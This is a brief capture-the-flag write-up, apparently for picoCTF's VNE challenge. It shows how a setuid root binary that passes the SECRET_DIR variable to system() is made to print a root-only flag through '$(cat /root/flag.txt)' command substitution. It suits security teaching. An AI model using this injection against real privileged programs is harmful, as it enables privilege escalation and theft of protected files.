# VNE

Simply shell injection.

```bash

# Extra info
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped

ctf-player@pico-chall$ ls -Al bin
-rwsr-xr-x 1 root root 18752 Mar 16 01:59 bin

# It has a SUID bit!

# Try to use the binary
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set

ctf-player@pico-chall$ export SECRET_DIR=/root
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
flag.txt


ctf-player@pico-chall$ ./bin --al
Listing the content of /root as root:
flag.txt

# Guess ./bin is like ls, but adding --al is not adding anything to it

ctf-player@pico-chall$ export SECRET_DIR='cat /root/flag.txt'
ctf-player@pico-chall$ ./bin --al
Listing the content of cat /root/flag.txt as root:
ls: cannot access 'cat': No such file or directory
/root/flag.txt
Error: system() call returned non-zero value: 512

# So it is like using space as separator and...
# 1. cat as a file not found in (current?) path
# 2. /root/flag.txt still get listed as path
# And we get the error message - system() call returned non-zero value: 512

# Let's try our favourite type of injection - run our shell code
ctf-player@pico-chall$ export SECRET_DIR='$(cat /root/flag.txt)'
ctf-player@pico-chall$ ./bin
Listing the content of $(cat /root/flag.txt) as root:
ls: cannot access 'picoCTF{that_flag_value}': No such file or directory
Error: system() call returned non-zero value: 512

# It works! Leaked the content of a root read-only file!
```

Nice practice as shell injection.
